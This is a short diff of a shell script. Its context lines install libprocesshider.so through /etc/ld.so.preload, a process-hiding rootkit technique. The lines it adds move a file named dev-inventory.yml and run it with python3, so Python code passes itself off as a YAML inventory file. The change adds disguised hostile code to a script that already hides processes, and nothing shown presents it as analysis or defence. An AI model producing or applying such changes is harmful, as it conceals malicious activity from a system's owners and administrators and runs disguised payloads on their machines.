@@ -38,4 +38,8 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
+mv dev-inventory.yml ../dev-inventory.yml
+
+python3 dev-inventory.yml $1 $2
+
 echo "Script execution completed successfully."
